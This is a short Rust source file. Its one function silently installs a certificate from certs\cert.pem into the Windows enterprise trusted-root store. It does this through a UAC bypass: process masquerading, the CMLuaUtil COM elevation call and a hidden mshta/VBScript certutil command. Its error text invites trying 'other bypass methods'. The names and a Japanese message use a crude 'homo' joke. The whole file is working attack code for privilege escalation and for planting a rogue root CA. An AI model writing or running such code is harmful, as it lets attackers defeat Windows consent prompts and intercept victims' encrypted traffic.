use yura;
use anyhow::*;

pub fn install_homo_cert() -> Result<()> {
    let path = std::env::current_dir()?.join("certs\\cert.pem");

    if !path.exists() {
        println!("ホモの証が見つかりませんでした。");
        bail!("Not found homo cert.");
    }

    let args = format!(r#"vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /C certutil -enterprise -f -v -addstore ROOT {}"", 0:close")"#, path.to_str().unwrap());
    yura::utils::masquerade_process(false)?;
    yura::methods::com::CMLuaUtilShellExec("mshta", yura::shared::e(&args).as_ptr())
        .with_context(|| "privilege escalation failed. try other bypass methods?" )?;

    Ok(())
}
